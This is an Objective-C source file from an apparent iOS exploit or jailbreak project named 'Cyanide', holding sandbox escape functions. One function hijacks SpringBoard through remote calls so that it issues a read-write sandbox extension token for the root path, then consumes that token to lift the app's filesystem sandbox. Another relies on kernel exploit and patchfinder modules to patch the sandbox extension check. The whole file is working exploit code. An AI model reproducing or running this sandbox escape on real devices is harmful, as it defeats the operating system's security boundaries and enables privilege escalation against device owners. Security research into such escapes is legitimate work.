//
//  sbx_research.m
//  Cyanide
//
//  Sandbox escape demo functions previously in ViewController.m.
//  The ViewController class was removed; these C functions are still
//  called by CyanideEngine.m.
//

#import <Foundation/Foundation.h>
#import "../LogTextView.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/krw.h"
#import "../kexploit/kutils.h"
#import "../kexploit/vnode.h"
#import "../kexploit/offsets.h"
#import "../kpf/patchfinder.h"
#import "../utils/sandbox.h"
#import "../TaskRop/RemoteCall.h"
#import "sandbox_research.h"

#import <sys/stat.h>

extern uint64_t g_kernel_slide;
extern int64_t sandbox_extension_consume(const char *extension_token);

int escape_sbx_demo2_in_session(void) {
    uint64_t memRemote = remote_call_trojan_mem();
    if (!memRemote) {
        printf("[%s:%d] no active remote-call session\n", __FUNCTION__, __LINE__);
        return -1;
    }

    uint64_t pathRemote = memRemote;
    remote_writeStr(pathRemote, "/");

    const char *appSandboxReadExt = "com.apple.app-sandbox.read-write";
    uint64_t sandboxExtensionEntry = memRemote + 0x100;
    remote_writeStr(sandboxExtensionEntry, appSandboxReadExt);

    printf("[SBX] Asking SpringBoard to issue r/w token for \"/\" (com.apple.app-sandbox.read-write).\n");
    uint64_t tokenRemote = do_remote_call_stable(1000, "sandbox_extension_issue_file",
                                                  sandboxExtensionEntry, pathRemote,
                                                  0, 0, 0, 0, 0, 0);
    if (!tokenRemote) return -1;

    char token[0x4000];
    memset(token, 0, 0x4000);
    if (!remote_read(tokenRemote, token, 0x4000)) {
        do_remote_call_stable(100, "free", tokenRemote, 0, 0, 0, 0, 0, 0, 0);
        return -1;
    }
    do_remote_call_stable(100, "free", tokenRemote, 0, 0, 0, 0, 0, 0, 0);

    printf("[SBX] Token received — consuming in-process.\n");
    int64_t handle = sandbox_extension_consume(token);
    if (handle < 0) return -1;

    printf("[SBX] Extension consumed (handle=%lld) — filesystem sandbox lifted.\n", handle);
    return 0;
}

int escape_sbx_demo2(void) {
    const char *target = "SpringBoard";
    if (init_remote_call(target, false) != 0) return -1;
    int ret = escape_sbx_demo2_in_session();
    destroy_remote_call();
    return ret;
}

int escape_sbx_demo3(void) {
    if (patch_sandbox_ext() == 0) {
        printf("successfully patched sbx extension\n");
    } else {
        printf("failed to patch sbx extension...\n");
    }
    return 0;
}
